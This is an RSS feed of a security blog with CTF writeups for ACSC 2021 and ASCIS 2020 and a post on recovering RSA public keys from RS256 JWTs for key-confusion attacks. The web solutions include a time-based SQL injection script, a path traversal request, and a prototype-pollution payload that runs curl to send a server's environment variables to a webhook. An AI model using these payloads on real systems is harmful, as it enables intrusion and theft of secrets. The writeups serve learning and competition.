<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Lam Nguyen's blog</title><link>https://lamnhh.github.io/</link><atom:link href="https://lamnhh.github.io/index.xml" rel="self" type="application/rss+xml"/><description>Lam Nguyen's blog</description><generator>Wowchemy (https://wowchemy.com)</generator><language>en-us</language><lastBuildDate>Sun, 19 Sep 2021 00:00:00 +0000</lastBuildDate><image><url>https://lamnhh.github.io/media/icon_hua2ec155b4296a9c9791d015323e16eb5_11927_512x512_fill_lanczos_center_3.png</url><title>Lam Nguyen's blog</title><link>https://lamnhh.github.io/</link></image><item><title>ACSC 2021 writeups</title><link>https://lamnhh.github.io/post/2021-09-20-acsc2021/</link><pubDate>Sun, 19 Sep 2021 00:00:00 +0000</pubDate><guid>https://lamnhh.github.io/post/2021-09-20-acsc2021/</guid><description>&lt;p>I competed in ACSC 2021 and got #16 (#2 VN). I &lt;del>overkilled&lt;/del> did web and crypto, and here are the writeups.&lt;/p>
&lt;h2 id="table-of-contents">Table of Contents&lt;/h2>
&lt;ol>
&lt;li>
&lt;p>&lt;a href="#crypto">Crypto&lt;/a>&lt;/p>
&lt;p>1.1. &lt;a href="#rsa-stream">RSA Stream&lt;/a>&lt;/p>
&lt;p>1.2. &lt;a href="#cbcbc">CBCBC&lt;/a>&lt;/p>
&lt;p>1.3. &lt;a href="#secret-saver">Secret Saver&lt;/a>&lt;/p>
&lt;p>1.4. &lt;a href="#swap-on-curve">Swap on Curve&lt;/a>&lt;/p>
&lt;p>1.5. &lt;a href="#two-rabin">Two Rabin&lt;/a>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;a href="#web">Web&lt;/a>&lt;/p>
&lt;p>2.1. &lt;a href="#api">API&lt;/a>&lt;/p>
&lt;p>2.2. &lt;a href="#favorite-emojis">Favorite Emojis&lt;/a>&lt;/p>
&lt;p>2.3. &lt;a href="#cowsay-as-a-service">Cowsay as a Service&lt;/a>&lt;/p>
&lt;/li>
&lt;/ol>
&lt;h2 id="crypto">Crypto&lt;/h2>
&lt;p>The function &lt;code>small_roots&lt;/code> below are from &lt;a href="https://github.com/defund/coppersmith/blob/master/coppersmith.sage" target="_blank" rel="noopener">https://github.com/defund/coppersmith/blob/master/coppersmith.sage&lt;/a>&lt;/p>
&lt;h3 id="rsa-stream">RSA Stream&lt;/h3>
&lt;p>We are given $m^{65537}$ and $m^{65539}$ and we need to compute $m$. Here&amp;rsquo;s the firsts overkill:&lt;/p>
&lt;ul>
&lt;li>I first computed $m^2 = (\text{flag} \cdot 256^{255 - 97} + \text{pad})^2$.&lt;/li>
&lt;li>$\text{flag}$ has length $97 &amp;lt; \frac{256}{2}$ so I use Coppersmith to solve the equation above.&lt;/li>
&lt;/ul>
&lt;pre>&lt;code class="language-python">from Crypto.Util.number import isPrime, bytes_to_long, long_to_bytes, inverse
from Crypto.Util.Padding import pad
n = 30004084769852356813752671105440339608383648259855991408799224369989221653141334011858388637782175392790629156827256797420595802457583565986882788667881921499468599322171673433298609987641468458633972069634856384101309327514278697390639738321868622386439249269795058985584353709739777081110979765232599757976759602245965314332404529910828253037394397471102918877473504943490285635862702543408002577628022054766664695619542702081689509713681170425764579507127909155563775027797744930354455708003402706090094588522963730499563711811899945647475596034599946875728770617584380135377604299815872040514361551864698426189453
e = 65537
f = open(&amp;quot;chal.py&amp;quot;, &amp;quot;rb&amp;quot;).read()
ct = open(&amp;quot;chal.enc&amp;quot;, &amp;quot;rb&amp;quot;).read()
em = []
for a in range(0, len(f), 256):
q = f[a:a+256]
if len(q) &amp;lt; 256:
q = pad(q, 256)
q = bytes_to_long(q)
c = bytes_to_long(ct[a:a + 256])
stream = c ^^ q
em.append(stream)
flag_len = 97
m2 = em[1] * inverse(em[0], n) % n
m = b&amp;quot;ASCS{}&amp;quot;
m = pad(m, 255)
m = bytes_to_long(m)
padding = b&amp;quot;\0&amp;quot; * flag_len
padding = bytes_to_long(pad(padding, 255))
R = Integers(n)
P.&amp;lt;x&amp;gt; = PolynomialRing(R, 1)
F = (x * 256^(255 - flag_len) + padding)^2 - m2
m = small_roots(F, (256^flag_len,), m=4, d=4)[0][0]
print(long_to_bytes(m))
&lt;/code>&lt;/pre>
&lt;h3 id="cbcbc">CBCBC&lt;/h3>
&lt;p>It&amp;rsquo;s a simple padding oracle. We can use &lt;code>iv1&lt;/code> to recover first block, and &lt;code>iv2&lt;/code> to recover second block and that is enough to recover the &lt;code>hidden_username&lt;/code>.&lt;/p>
&lt;pre>&lt;code class="language-python">from base64 import b64encode, b64decode
from string import printable
from pwn import process, remote
with process([&amp;quot;python3&amp;quot;, &amp;quot;chal.py&amp;quot;]) as tube:
# with remote(&amp;quot;cbcbc.chal.acsc.asia&amp;quot;, 52171) as tube:
print(tube.recvuntil(b&amp;quot;=====================================================&amp;quot;).decode())
print(tube.recvuntil(b&amp;quot;3. Exit&amp;quot;).decode())
tube.recv()
tube.sendline(b&amp;quot;1&amp;quot;)
tube.recv()
tube.sendline(b&amp;quot;&amp;quot;)
tube.recvline()
target_token = b64decode(tube.recvline().strip())
print(&amp;quot;Target token&amp;quot;, target_token)
iv1 = target_token[:16]
iv2 = target_token[16:32]
enc = target_token[32:]
enc = enc[:16]
fail_msg = b&amp;quot;Failed to login! Check your token again&amp;quot;
def query(iv1: bytes, iv2: bytes, enc: bytes) -&amp;gt; bool:
token = iv1 + iv2 + enc
token = b64encode(token)
tube.recvuntil(b&amp;quot;3. Exit&amp;quot;)
tube.sendline(b&amp;quot;2&amp;quot;)
tube.recv()
tube.sendline(b&amp;quot;mugi&amp;quot;)
tube.recv()
tube.sendline(token)
res = tube.recvline()
return fail_msg not in res
ans = bytearray(b&amp;quot;\0&amp;quot; * 16)
for i in range(15, -1, -1):
for c in range(256):
if chr(c ^ (16 - i)) not in printable:
continue
new_iv1 = bytearray(iv1)
new_iv1[i] ^= c
for j in range(i + 1, 16):
new_iv1[j] ^= (16 - i) ^ ans[j]
if query(new_iv1, iv2, enc):
ans[i] = (c ^ (16 - i))
break
print(ans)
&lt;/code>&lt;/pre>
&lt;h3 id="secret-saver">Secret Saver&lt;/h3>
&lt;p>I remember a similar challenge from CryptoHack. The main idea is to submit the payload repeated a few times. If the payload is correct, the compressed data should have the shortest length among all the candidates. From there we can iterate over each character and get the flag.&lt;/p>
&lt;p>The problem here is how to get the compressed length. I used time-based SQLi to binary search the length. For the first candidate, I search on the whole range $(0-1000)$, suppose its length is $x$, then for the rest I search on range $(x - 10, x + 10)$.&lt;/p>
&lt;pre>&lt;code class="language-python">import requests
from string import ascii_letters, digits
charset = [
&amp;quot;_&amp;lt;&amp;gt;?!+;:.}&amp;quot;,
digits,
ascii_letters,
]
charset = &amp;quot;&amp;quot;.join(charset)
url = &amp;quot;http://167.99.77.49/&amp;quot;
thres = 0.3
def query(msg: str, vl = 0, vr = 1000) -&amp;gt; int:
l = vl
r = vr
f = -1
while l &amp;lt;= r:
mid = (l + r) // 2
res = requests.post(url, data={
&amp;quot;name&amp;quot;: f&amp;quot;' || (case when {str(mid).zfill(4)} &amp;lt;= char_length(msg) then sleep({thres}) else '' end) || '&amp;quot;,
&amp;quot;msg&amp;quot;: msg * 20
})
print(res.elapsed.total_seconds())
if res.elapsed.total_seconds() &amp;gt; thres:
f = mid
l = mid + 1
else:
r = mid - 1
return f
ans = &amp;quot;ACSC{MAK3-CRiME-4TT4CK-GREAT-AGaiN!}&amp;quot;
for i in range(10):
len_list = []
vl = 0
vr = 1000
for p in range(len(charset)):
c = charset[p]
len_list.append(query(ans + c, vl, vr))
print(len_list[-1], c)
if p == 0:
vl = len_list[-1] - 10
vr = len_list[-1] + 10
if len_list[-1] &amp;lt; len_list[0]:
break
min_len = min(len_list)
for p in range(len(charset)):
if min_len != len_list[p]:
continue
c = charset[p]
ans += c
break
print(ans)
&lt;/code>&lt;/pre>
&lt;p>This solution took a lot of time to run and it&amp;rsquo;s extremely inconsistent. Luckily the flag is easy to guess so I could know early when the code fails. Also I can edit the charset to catch the target character quicker.&lt;/p>
&lt;p>After the contest, I learned of a way to use &lt;code>updatexml&lt;/code> to throw error with query value (&lt;a href="http://www.securityidiots.com/Web-Pentest/SQL-Injection/XPATH-Error-Based-Injection-UpdateXML.html%29" target="_blank" rel="noopener">http://www.securityidiots.com/Web-Pentest/SQL-Injection/XPATH-Error-Based-Injection-UpdateXML.html)&lt;/a>.&lt;/p>
&lt;h3 id="swap-on-curve">Swap on Curve&lt;/h3>
&lt;p>I did some simple transformations to create a univariate polynomial on $x$.&lt;/p>
&lt;p>\begin{equation}
\begin{aligned}
x^2 &amp;amp;= y^3 + ay + b \\&lt;br>
\Leftrightarrow x^2 - b &amp;amp;= y^3 + ay \\&lt;br>
\Rightarrow (x^2 - b)^2 &amp;amp;= (y^3 + ay)^2 \\&lt;br>
\Leftrightarrow (x^2 - b)^2 &amp;amp;= y^6 + a^2 y^2 + 2ay^4 \\&lt;br>
\Leftrightarrow (x^2 - b)^2 &amp;amp;= (x^3 + ax + b)^3 + a^2 (x^3 + ax + b) + 2a(x^3 + ax + b)^2
\end{aligned}
\end{equation}&lt;/p>
&lt;p>No idea how &lt;code>.roots()&lt;/code> solved this, but it did.&lt;/p>
&lt;pre>&lt;code class="language-python">from Crypto.Util.number import long_to_bytes
p = 10224339405907703092027271021531545025590069329651203467716750905186360905870976608482239954157859974243721027388367833391620238905205324488863654155905507
a = 4497571717921592398955060922592201381291364158316041225609739861880668012419104521771916052114951221663782888917019515720822797673629101617287519628798278
b = 1147822627440179166862874039888124662334972701778333205963385274435770863246836847305423006003688412952676893584685957117091707234660746455918810395379096
EC = EllipticCurve(GF(p), [a, b])
P.&amp;lt;x&amp;gt; = PolynomialRing(GF(p))
Y2 = x^3 + a * x + b
F = (x^2 - b)^2 - (Y2^3 + a^2 * Y2 + 2 * a * Y2^2)
cand = []
for x, _ in F.roots():
y2 = Y2(x)
y = y2.sqrt()
cand.append(x)
cand.append(y)
cand.append(-y)
for x in cand:
f = long_to_bytes(int(x))
if b&amp;quot;ACSC&amp;quot; in f:
print(f)
&lt;/code>&lt;/pre>
&lt;h3 id="two-rabin">Two Rabin&lt;/h3>
&lt;p>The first part is trivial Coppersmith. For the second part, apply Coppersmith short-pad.&lt;/p>
&lt;p>The code below is taken from &lt;a href="http://mslc.ctf.su/wp/confidence-ctf-2015-rsa1-crypto-400/" target="_blank" rel="noopener">http://mslc.ctf.su/wp/confidence-ctf-2015-rsa1-crypto-400/&lt;/a>&lt;/p>
&lt;pre>&lt;code class="language-python">flag1_len = 98
n = 105663510238670420757255989578978162666434740162415948750279893317701612062865075870926559751210244886747509597507458509604874043682717453885668881354391379276091832437791327382673554621542363370695590872213882821916016679451005257003326444660295787578301365987666679013861017982035560204259777436442969488099
B = 12408624070212894491872051808326026233625878902991556747856160971787460076467522269639429595067604541456868927539680514190186916845592948405088662144279471
c1 = 47149257341850631803344907793040624016460864394802627848277699824692112650262968210121452299581667376809654259561510658416826163949830223407035750286554940980726936799838074413937433800942520987785496915219844827204556044437125649495753599550708106983195864758161432571740109614959841908745488347057154186396
c2 = 38096143360064857625836039270668052307251843760085437365614169441559213241186400206703536344838144000472263634954875924378598171294646491844012132284477949793329427432803416979432652621257006572714223359085436237334735438682570204741205174909769464683299442221434350777366303691294099640097749346031264625862
flag2_len = 98
hard_c1 = 73091191827823774495468908722773206641492423784400072752465168109870542883199959598717050676487545742986091081315652284268136739187215026022065778742525832001516743913783423994796457270286069750481789982702001563824813913547627820131760747156379815528428547155422785084878636818919308472977926622234822351389
hard_c2 = 21303605284622657693928572452692917426184397648451262767916068031147685805357948196368866787751567262515163804299565902544134567172298465831142768549321228087238170761793574794991881327590118848547031077305045920819173332543516073028600540903504720606513570298252979409711977771956104783864344110894347670094
PRxy.&amp;lt;x,y&amp;gt; = PolynomialRing(Zmod(n))
PRx.&amp;lt;xn&amp;gt; = PolynomialRing(Zmod(n))
PRZZ.&amp;lt;xz,yz&amp;gt; = PolynomialRing(Zmod(n))
g1 = x * (x + B) - hard_c1
g2 = (x + y) * (x + y + B) - hard_c2
q1 = g1.change_ring(PRZZ)
q2 = g2.change_ring(PRZZ)
h = q2.resultant(q1)
h = h.univariate_polynomial() # x is hopefully eliminated
h = h.change_ring(PRx).subs(y=xn)
h = h.monic()
print(h)
roots = h.small_roots(X=2^240, epsilon=0.02)
print(roots)
&lt;/code>&lt;/pre>
&lt;pre>&lt;code class="language-python">from Crypto.Util.number import long_to_bytes
flag1_len = 98
flag1_len = 98
n = 105663510238670420757255989578978162666434740162415948750279893317701612062865075870926559751210244886747509597507458509604874043682717453885668881354391379276091832437791327382673554621542363370695590872213882821916016679451005257003326444660295787578301365987666679013861017982035560204259777436442969488099
B = 12408624070212894491872051808326026233625878902991556747856160971787460076467522269639429595067604541456868927539680514190186916845592948405088662144279471
c1 = 47149257341850631803344907793040624016460864394802627848277699824692112650262968210121452299581667376809654259561510658416826163949830223407035750286554940980726936799838074413937433800942520987785496915219844827204556044437125649495753599550708106983195864758161432571740109614959841908745488347057154186396
c2 = 38096143360064857625836039270668052307251843760085437365614169441559213241186400206703536344838144000472263634954875924378598171294646491844012132284477949793329427432803416979432652621257006572714223359085436237334735438682570204741205174909769464683299442221434350777366303691294099640097749346031264625862
flag2_len = 98
hard_c1 = 73091191827823774495468908722773206641492423784400072752465168109870542883199959598717050676487545742986091081315652284268136739187215026022065778742525832001516743913783423994796457270286069750481789982702001563824813913547627820131760747156379815528428547155422785084878636818919308472977926622234822351389
hard_c2 = 21303605284622657693928572452692917426184397648451262767916068031147685805357948196368866787751567262515163804299565902544134567172298465831142768549321228087238170761793574794991881327590118848547031077305045920819173332543516073028600540903504720606513570298252979409711977771956104783864344110894347670094
y = 105663510238670420757255989578978162666434740162415948750279893317701612062865075870926559751210244886747509597507458509604874043682717453885668881354391379276091832437791327382673554621542363370695590872213882821916016679451005257003324807101635213925825667932900258849901826251288979045274120411473033890824
R = Integers(n)
P.&amp;lt;x&amp;gt; = PolynomialRing(R)
g1 = x * (x + B) - hard_c1
g2 = (x + y) * (x + y + B) - hard_c2
while g2:
g1, g2 = g2, g1 % g2
g1 = g1.monic()
m1 = -g1[0]
m2 = m1 + y
print(long_to_bytes(int(m2) // (2^240)))
&lt;/code>&lt;/pre>
&lt;h2 id="web">Web&lt;/h2>
&lt;h3 id="api">API&lt;/h3>
&lt;p>The server does not abort after &amp;ldquo;redirecting&amp;rdquo;, so the admin code is still run. The exploit is as follow:&lt;/p>
&lt;ul>
&lt;li>
&lt;p>Register account:&lt;/p>
&lt;pre>&lt;code>Mugi/A123123123
&lt;/code>&lt;/pre>
&lt;/li>
&lt;li>
&lt;p>Get passcode:&lt;/p>
&lt;pre>&lt;code>id=Mugi&amp;amp;pw=A123123123&amp;amp;c=i&amp;amp;c2=gp
&lt;/code>&lt;/pre>
&lt;/li>
&lt;li>
&lt;p>Get flag&lt;/p>
&lt;pre>&lt;code>id=Mugi&amp;amp;pw=A123123123&amp;amp;c=i&amp;amp;c2=gd&amp;amp;pas=:&amp;lt;vNk&amp;amp;db=../../../../../flag
&lt;/code>&lt;/pre>
&lt;/li>
&lt;/ul>
&lt;h3 id="favorite-emojis">Favorite Emojis&lt;/h3>
&lt;ul>
&lt;li>First, add a query &lt;code>_escaped_fragment_=1&lt;/code> to the URL to get to the &lt;code>renderer&lt;/code> route.&lt;/li>
&lt;li>Second, my URL is modified to be &lt;code>$host$request_uri&lt;/code>. &lt;code>$host&lt;/code> is taken from the &lt;code>Host&lt;/code> header in the HTTP request.
&lt;ul>
&lt;li>I tried &lt;code>Host: api:8000&lt;/code> but it strips the port&lt;/li>
&lt;li>So I ngrok a local HTTP server that contains a HTML file &lt;code>test.html&lt;/code> that does &lt;code>location = http://api:8000&lt;/code>. The ngrok URL does not contain a port so it isn&amp;rsquo;t stripped.&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Final payload:
&lt;pre>&lt;code>GET /test.html?_escaped_fragment_=1 HTTP/1.1
Host: f697-1-52-54-122.ngrok.io
&lt;/code>&lt;/pre>
&lt;/li>
&lt;/ul>
&lt;h3 id="cowsay-as-a-service">Cowsay as a Service&lt;/h3>
&lt;p>It has an obvious prototype pollution vuln. To exploit it, set username to &lt;code>__proto__&lt;/code>, then call the &lt;code>/setting&lt;/code> endpoint.&lt;/p>
&lt;p>&lt;del>Another overkill incoming.&lt;/del>&lt;/p>
&lt;p>I polluted the following:&lt;/p>
&lt;pre>&lt;code class="language-javascript">shell = &amp;quot;/usr/local/bin/node&amp;quot;;
env = {
NODE_OPTIONS: &amp;quot;--require /proc/self/environ&amp;quot;,
payload:
'require(&amp;quot;child_process&amp;quot;).execSync(\'curl -d &amp;quot;$(cat /proc/1/environ)&amp;quot; webhook\');//',
};
&lt;/code>&lt;/pre>
&lt;p>Run the &lt;code>/cowsay&lt;/code> route and the server will execute the payload and we got the flag.&lt;/p>
&lt;h2 id="some-2meirl4meirl-thoughts">Some 2meirl4meirl thoughts&lt;/h2>
&lt;pre>&lt;code class="language-text">&amp;gt; still have an irrational fear of Java.
&amp;gt; could not solve the 1 non-Java challenge left.
&amp;gt; could not solve all the non-lattice challenges.
&amp;gt; what the hell is lattice?
&amp;gt; why do I overkill so much?
&amp;gt; pain
&amp;gt; anyway, hi Greece
&lt;/code>&lt;/pre></description></item><item><title>Recover public keys from JWTs signed using RS256</title><link>https://lamnhh.github.io/post/2021-02-22-jwt-rs256-recover-public-key/</link><pubDate>Mon, 22 Feb 2021 00:00:00 +0000</pubDate><guid>https://lamnhh.github.io/post/2021-02-22-jwt-rs256-recover-public-key/</guid><description>&lt;h1 id="scenario">Scenario&lt;/h1>
&lt;p>A web server uses RS256 algorithm for their JWT signing. Both public key and private key are unknown. The adversary can query the server to sign a chosen message. The goal is to recover the public key.&lt;/p>
&lt;h1 id="how-jwt-works">How JWT works&lt;/h1>
&lt;p>Take a look at a sample JWT:&lt;/p>
&lt;pre>&lt;code>eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJicm9uemUiLCJmZnAiOiJDQTEyMzQxMjM0In0.jv953fHSWqvR7SY8l3g2ku_BRAXqIvKOIq_lAjPXWXgUeIml6myJeRmqoSkDZ3-YpyyQ2hQxTuBip8igyhOHz0dc6A08Psip1KuqVjnilywN1JcH0euXGVQeeI-FwdeIArPwfoDUFXXKz8sh3EO9gK6dAwmWGLAV4wMF50fVjb7WuHEiL6w9WOeKfBneV4_3skDm8ljXoGGGyP7YkL6ez-fwacIe7_m-4MuQdfZfO1t-g2Vjr-yaImUHrZyW9Q8cAM3eJZ7m0UCnb8pG5yd8rU5vcXovKrbX6ZIYwaw4-IvFtJdU6h2jXwm2uKjRnhfYezi_iKARFO2Mv3vJmkX-Kg
&lt;/code>&lt;/pre>
&lt;p>It consists of 3 parts:&lt;/p>
&lt;p>Header:&lt;/p>
&lt;pre>&lt;code>eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9
&lt;/code>&lt;/pre>
&lt;p>Payload:&lt;/p>
&lt;pre>&lt;code>eyJzdGF0dXMiOiJicm9uemUiLCJmZnAiOiJDQTEyMzQxMjM0In0
&lt;/code>&lt;/pre>
&lt;p>Signature:&lt;/p>
&lt;pre>&lt;code>jv953fHSWqvR7SY8l3g2ku_BRAXqIvKOIq_lAjPXWXgUeIml6myJeRmqoSkDZ3-YpyyQ2hQxTuBip8igyhOHz0dc6A08Psip1KuqVjnilywN1JcH0euXGVQeeI-FwdeIArPwfoDUFXXKz8sh3EO9gK6dAwmWGLAV4wMF50fVjb7WuHEiL6w9WOeKfBneV4_3skDm8ljXoGGGyP7YkL6ez-fwacIe7_m-4MuQdfZfO1t-g2Vjr-yaImUHrZyW9Q8cAM3eJZ7m0UCnb8pG5yd8rU5vcXovKrbX6ZIYwaw4-IvFtJdU6h2jXwm2uKjRnhfYezi_iKARFO2Mv3vJmkX-Kg
&lt;/code>&lt;/pre>
&lt;p>Each of these part is base64-ed. The signature is computed on &lt;code>Header + &amp;quot;.&amp;quot; + Payload&lt;/code>. The signing algorithm is specified in the raw header (in the sample above, it&amp;rsquo;s RS256 - RSA with SHA256).&lt;/p>
&lt;h1 id="how-rs256-works">How RS256 works&lt;/h1>
&lt;p>RS256 - RSA with SHA256 does the following:&lt;/p>
&lt;ul>
&lt;li>Encode the message using EMSA-PKCS1-v1_5 (&lt;a href="https://tools.ietf.org/html/rfc3447#section-9.2" target="_blank" rel="noopener">RFC3447, section9.2&lt;/a>) with SHA256 as the hash function&lt;/li>
&lt;li>Perform textbook RSA signing on the encoded message&lt;/li>
&lt;/ul>
&lt;h2 id="more-detail-on-the-rsa-part">More detail on the RSA part&lt;/h2>
&lt;p>Given the key $(N, e, d)$, the signature for message $m$ is computed as:&lt;/p>
&lt;p>$$s = m^d \pmod{N}$$&lt;/p>
&lt;p>To verify the signature, check if:&lt;/p>
&lt;p>$$
\begin{equation}
s^e \equiv m^{de} \equiv m \pmod{N}
\label{eq:sample}
\tag{*}
\end{equation}
$$&lt;/p>
&lt;h1 id="the-attack">The attack&lt;/h1>
&lt;p>From $(*)$, we can see that:&lt;/p>
&lt;p>$$s^e - m \equiv 0 \pmod{N}$$&lt;/p>
&lt;p>Given a lot of $(message, signature)$ pairs $(m_1, s_1), (m_2, s_2), &amp;hellip;, (m_k, s_k)$, with high chance, we will get $N$ when we compute:&lt;/p>
&lt;p>$$GCD(s_1^e - m_1, s_2^e - m_2, &amp;hellip;, s_k^e - m_k)$$&lt;/p>
&lt;h2 id="_where-does-e-come-from_">&lt;strong>&lt;em>Where does e come from?&lt;/em>&lt;/strong>&lt;/h2>
&lt;p>$e$ is usually in the form $2^{2^k} + 1$ with small $k$. We can bruteforce $e$.&lt;/p>
&lt;h2 id="_when-can-this-attack-be-fatal_">&lt;strong>&lt;em>When can this attack be fatal?&lt;/em>&lt;/strong>&lt;/h2>
&lt;p>When the server uses a JWT library that is vulnerable to key confusion (can use RSA key to decode HS256 tokens), for example, CVE-2016-10555 or CVE-2017-11424.&lt;/p>
&lt;p>In those cases, the attacker can modify the &lt;code>alg&lt;/code> field to HS256 in the header, change the payload however they want, then sign it with the public key with HS256 algorithm. The server will decode the token using the public key, thus giving the attacker authentication.&lt;/p>
&lt;h2 id="_notes-about-implementation_">&lt;strong>&lt;em>Notes about implementation&lt;/em>&lt;/strong>&lt;/h2>
&lt;p>JWT keys are usually large (at least 2048 bit long). Computing $s^e$ can be very slow. For Python, use &lt;code>mpz&lt;/code> from &lt;code>gmpy2&lt;/code> to speed up things.&lt;/p>
&lt;p>Sample implementation (writeup for the Cr0wnAir challenge (the crypto part) from &lt;a href="https://ctftime.org/event/1246" target="_blank" rel="noopener">UnionCTF 2021&lt;/a>):&lt;/p>
&lt;pre>&lt;code class="language-python">from Crypto.Signature import PKCS1_v1_5
from Crypto.PublicKey import RSA
from Crypto.Hash import SHA256
from Crypto.Util.number import bytes_to_long, long_to_bytes
from base64 import b64decode, urlsafe_b64decode
from gmpy2 import gcd, mpz
target_bit_length = 2048
jwt_list = [
&amp;quot;eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJicm9uemUiLCJmZnAiOiJDQTEyMzQxMjM0In0.jv953fHSWqvR7SY8l3g2ku_BRAXqIvKOIq_lAjPXWXgUeIml6myJeRmqoSkDZ3-YpyyQ2hQxTuBip8igyhOHz0dc6A08Psip1KuqVjnilywN1JcH0euXGVQeeI-FwdeIArPwfoDUFXXKz8sh3EO9gK6dAwmWGLAV4wMF50fVjb7WuHEiL6w9WOeKfBneV4_3skDm8ljXoGGGyP7YkL6ez-fwacIe7_m-4MuQdfZfO1t-g2Vjr-yaImUHrZyW9Q8cAM3eJZ7m0UCnb8pG5yd8rU5vcXovKrbX6ZIYwaw4-IvFtJdU6h2jXwm2uKjRnhfYezi_iKARFO2Mv3vJmkX-Kg&amp;quot;,
&amp;quot;eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJicm9uemUiLCJmZnAiOiJDQTEyMzQxMjM1In0.vtp96NW_PxO-_GW2e1u0xu4FTMYjYgwfe2wYKuksUGE_lM1ZeiyitDiUMXaQ3s5T3pD9ALHcqpsBY-5z1DbxVgPMvrqaExnw0merTDm17ku3b0ys5-dJOybb0meI7eu4i-Qykh0X_XHyOlxT6H-ZyxCcKov9sbnJVk3fbZY2lzjKuYZAIYQzXd5J65GooA7vkR2cWeK6rypHFyDPtuFaPLOhE6cLbC9VVyD4oxu0bvkpW6lRuiQni-S4uMkH2y7OUA16nNNVVwixUGVPwzGW8oS61lXiA3OHp1o336cyKJ9B4_ae1FeClPgUAnH_CWQIoZzco2Jb3mnHFq7lVgBnug&amp;quot;,
]
def b64urldecode(b64: str) -&amp;gt; str:
return urlsafe_b64decode(b64+(&amp;quot;=&amp;quot; * (len(b64) % 4)))
def parse(jwt: str) -&amp;gt; (bytes, bytes):
tokens = jwt.split(&amp;quot;.&amp;quot;)
return &amp;quot;.&amp;quot;.join(tokens[0:2]), b64urldecode(tokens[2])
def get_rsa_mc(jwt: str) -&amp;gt; int:
inp, sig = parse(jwt)
h = SHA256.new(inp.encode())
m = bytes_to_long(
PKCS1_v1_5.pkcs1_15._EMSA_PKCS1_V1_5_ENCODE(h, target_bit_length // 8)
)
c = bytes_to_long(sig)
return mpz(m), mpz(c)
def get_pubkey(n: int, e: int) -&amp;gt; str:
k = RSA.construct([n, e])
return k.export_key(&amp;quot;PEM&amp;quot;)
ms = []
cs = []
for jwt in jwt_list:
m, c = get_rsa_mc(jwt)
ms.append(m)
cs.append(c)
assert len(ms) &amp;gt; 0 and len(cs) == len(ms)
e = 65537
n = pow(cs[0], e) - ms[0]
for i in range(1, len(ms)):
m = ms[i]
c = cs[i]
n = gcd(n, pow(c, e) - m)
for i in range(2, 1000):
while n % i == 0:
n //= i
n = int(n)
print(n)
print(get_pubkey(n, e))
&lt;/code>&lt;/pre>
&lt;h2 id="_lessons_">&lt;strong>&lt;em>Lessons&lt;/em>&lt;/strong>&lt;/h2>
&lt;ul>
&lt;li>Do not rely on public keys for security purposes.&lt;/li>
&lt;li>Be careful when using JWT. Or even better, don&amp;rsquo;t use them.&lt;/li>
&lt;/ul>
&lt;h1 id="references">References&lt;/h1>
&lt;ul>
&lt;li>&lt;a href="https://blog.silentsignal.eu/2021/02/08/abusing-jwt-public-keys-without-the-public-key/" target="_blank" rel="noopener">Abusing JWT public keys without the public key&lt;/a>&lt;/li>
&lt;/ul></description></item><item><title>ASCIS 2020 - Crypto writeups</title><link>https://lamnhh.github.io/post/2021-01-09-ascis2020-crypto/</link><pubDate>Sat, 09 Jan 2021 00:00:00 +0000</pubDate><guid>https://lamnhh.github.io/post/2021-01-09-ascis2020-crypto/</guid><description>&lt;p>This is me upsolving the challenges 1 month after the contest. All patches are unavailable to download, so all I discuss here is how to attack the original challenges (with no patches).&lt;/p>
&lt;p>The challenge can be summarised as:&lt;/p>
&lt;ul>
&lt;li>Given an oracle $E$ which we can query: give it a string $s$ and it will return $E(s)$.&lt;/li>
&lt;li>The target is to forge $E(target)$ where&lt;/li>
&lt;/ul>
&lt;p>$$target = \text{0x2020202020202020202020202020202020202020202020202020202020202020}$$&lt;/p>
&lt;p>(32 bytes 0x20). The catch is that we cannot query for $E(target)$ directly.&lt;/p>
&lt;p>There are 3 oracles we need to attack:&lt;/p>
&lt;ul>
&lt;li>AES-CBC 256&lt;/li>
&lt;li>AES-GCM 256&lt;/li>
&lt;li>RSA on Gaussian integers&lt;/li>
&lt;/ul>
&lt;h1 id="aes-cbc-256">AES-CBC 256&lt;/h1>
&lt;p>
&lt;figure id="figure-cbc-encryption">
&lt;div class="d-flex justify-content-center">
&lt;div class="w-100" >&lt;img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/80/CBC_encryption.svg/1920px-CBC_encryption.svg.png" alt="CBC Encryption" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;figcaption>
CBC Encryption
&lt;/figcaption>&lt;/figure>
&lt;/p>
&lt;p>The oracle randomises its IV, requires the plaintext to be exactly 32 bytes long (2 blocks), which means it will feed into the cipher 3 blocks of data (because of padding). We have the exact flowchart as the image above.&lt;/p>
&lt;p>The solution is:&lt;/p>
&lt;ul>
&lt;li>First, query $E(00 * 16 + 20 * 16)$, we get back $IV$ and $CT$.&lt;/li>
&lt;li>Second, compute $IV' = IV \oplus (20 * 16)$.&lt;/li>
&lt;li>Submit $IV' + CT$ and get the flag.&lt;/li>
&lt;/ul>
&lt;p>Explanation: call the first block of plaintext $PT$. For our plaintext, we have $PT = 00 * 16$.&lt;/p>
&lt;p>We can see that:&lt;/p>
&lt;p>$PT \oplus IV = (PT \oplus (20 * 16)) \oplus (IV \oplus (20 * 16)) = (target PT) \oplus IV'$&lt;/p>
&lt;p>What this means is that using target PT and IV', we have the same first block of ciphertext as above. The rest blocks will subsequently be the same. Now we have the full ciphertext for $target$.&lt;/p>
&lt;h1 id="aes-gcm-256">AES-GCM 256&lt;/h1>
&lt;p>
&lt;figure id="figure-gcm-encryption">
&lt;div class="d-flex justify-content-center">
&lt;div class="w-100" >&lt;img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/25/GCM-Galois_Counter_Mode_with_IV.svg/800px-GCM-Galois_Counter_Mode_with_IV.svg.png" alt="GCM encryption" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;figcaption>
GCM encryption
&lt;/figcaption>&lt;/figure>
&lt;/p>
